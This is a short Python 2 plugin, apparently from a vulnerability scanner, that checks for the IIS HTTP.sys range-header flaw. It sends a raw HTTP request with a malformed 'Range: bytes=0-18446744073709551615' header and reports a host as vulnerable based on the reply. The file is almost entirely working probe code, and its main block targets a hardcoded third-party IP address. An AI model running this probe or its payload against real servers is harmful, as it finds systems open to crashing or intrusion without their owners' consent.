#!/usr/bin/env python
# encoding: utf-8
from t import T

import socket


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3



        result = {}
        result['result']=False

        hexAllFfff = "18446744073709551615"
        vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
        target_url='http://'+ip+':'+port
        socket.setdefaulttimeout(timeout)
        client_socket=None
        # 测试是否有leak
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, int(port)))
            client_socket.send(vuln_buffer)
            goodResp = client_socket.recv(1024)

            if "Requested Range Not Satisfiable" in goodResp and "IIS" in goodResp:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='iis Vulnerability'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vuln_buffer
                result['VerifyInfo']['result'] =goodResp
        except:
            pass

        finally:
            if client_socket is not None:
                client_socket.close()
                del client_socket
            return result






if __name__ == '__main__':
    print P().verify(ip='125.71.1.238',port='80')